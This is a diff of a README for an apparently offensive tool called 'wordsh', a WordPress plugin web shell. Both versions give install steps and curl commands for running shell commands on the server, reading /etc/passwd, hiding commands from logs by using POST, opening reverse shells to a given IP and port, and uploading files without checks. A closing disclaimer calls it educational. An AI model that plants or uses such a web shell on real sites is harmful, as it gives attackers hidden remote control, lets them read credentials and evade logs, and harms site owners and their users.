@@ -1,62 +1,84 @@
-wordpress-shell
-===============
+<p align='center'>
+   <img src='.assets/backdoor.png' alt='' width='256' />
+</p>
 
-Cheap &amp; Nasty Wordpress Command Execution Shell.
+<h2 align='center'>wordsh</h2>
 
-Execute Commands as the webserver you are serving wordpress with!
-Uploaded shell will probably be at <host>/wp-content/plugins/shell/shell.php
+<p align='center'><i>Quick & dirty Wordpress Command Execution Shell.</i></p>
 
-Install
-=======
-To install the shell, we are assuming you have administrative access to the Wordpress install and can install plugins.
-Either upload the zip file located in the `dist/` directory, or create your own archive with:
+Execute shell  commands on  your wordpress  server. Uploaded  shell will
+probably be at `<your-host>/wp-content/plugins/shell/shell.php`
 
-```bash
-$ zip -r shell.zip shell.php
-  adding: shell.php (deflated 39%)
-  
-$ ls -lah shell.zip
--rw-r--r--  1 bob  staff   492B Aug 29 14:17 shell.zip
-```
+### Installation
 
-Once uploaded, navigate to `/wp-content/plugins/shell/shell.php` and provide the `cmd` or `ip` as an argument.
+To install the shell, we are  assuming you have administrative rights to
+Wordpress and can  install plugins since transferring a PHP  file to the
+media  library  shouldn't work  anyway.  Otherwise,  you have  a  bigger
+problem.
 
-Sample Usage
-============
+Simply upload  the zip  file located  in the Releases  section as  a new
+extension and you're good to go.
 
-```bash
-root@kali:~# curl -v "http://192.168.0.1/wp-content/plugins/shell/shell.php?$(python -c 'import urllib; print urllib.urlencode({"cmd":"uname -a"})')"
-* About to connect() to 192.168.0.1 port 80 (#0)
-*   Trying 192.168.0.1...
-* connected
-* Connected to 192.168.0.1 (192.168.0.1) port 80 (#0)
-> GET /wp-content/plugins/shell/shell.php?cmd=uname+-a HTTP/1.1
-> User-Agent: curl/7.26.0
-> Host: 192.168.0.1
-> Accept: */*
-> 
-* additional stuff not fine transfer.c:1037: 0 0
-* HTTP 1.1 or later with persistent connection, pipelining supported
-< HTTP/1.1 200 OK
-< Date: Thu, 28 Aug 2014 09:28:24 GMT
-< Server: Apache/2.2.14 (Ubuntu)
-< X-Powered-By: PHP/5.3.2-1ubuntu4
-< Vary: Accept-Encoding
-< Content-Length: 191
-< Content-Type: text/html
+### Usage
 
+Using  the shell  is straightforward.  Simply pass  `sh` commands  as an
+argument to the shell :
+
+```sh
+❯ curl 'http://host/.../shell.php?cmd=uname+-a'
 Linux wordpress-server 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux
 ```
 
-Reverse shell (default port:443)
-============
-```bash
-root@kali:~# curl -v "http://192.168.0.1/wp-content/plugins/shell/shell.php?$(python -c 'import urllib; print urllib.urlencode({"ip":"192.168.1.101"})')"
+You may  as well pass  these arguments in a  POST request, which  is the
+recommended way to keep your commands out of logs.
+
+```sh
+❯ curl 'http://host/.../shell.php' --data-urlencode 'cmd=ls'
+LICENSE
+README.md
+shell.php
 ```
 
-```bash
-root@kali:~# curl -v "http://192.168.0.1/wp-content/plugins/shell/shell.php?$(python -c 'import urllib; print urllib.urlencode({"ip":"192.168.1.101","port":"1234"})')"
+More complex  commands are  also supported,  careful about  your quoting
+though.
+
+```sh
+❯ curl 'http://host/.../shell.php' --data-urlencode 'cmd=cat /etc/passwd | grep -v "\(false\|nologin\)"'
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
 ```
 
+```sh
+❯ curl 'http://host/.../shell.php' --data-urlencode 'cmd=python -c "from urllib.parse import urlencode; print(urlencode({\"cmd\": \"uname -a\"}))"'
+cmd=uname+-a
+```
 
+You can also open a reverse  shell using the `ip` and `port` parameters.
+The default port is `443`.
 
+```sh
+❯ curl 'http://host/.../shell.php' --data-urlencode 'ip=127.0.0.1'
+```
+
+```sh
+❯ curl 'http://host/.../shell.php' --data-urlencode 'ip=127.0.0.1' --data-urlencode 'port=1337'
+```
+
+There is also an option provided for convenience to upload a file to the
+directory of the plugin *unconditionally and without checks*.
+
+```sh
+❯ curl 'http://host/.../shell.php' -F 'file=@some_file'
+❯ curl 'http://host/.../shell.php' --data-urlencode 'cmd=ls'
+LICENSE
+README.md
+shell.php
+some_file
+```
+
+### Disclaimer
+
+Running unathorized attacks to public or private servers is illegal. The
+content  of this  repository is  for  educational purposes  only and  no
+responsibility will be  taken by the authors  in case of ill  use of the
+provided material.
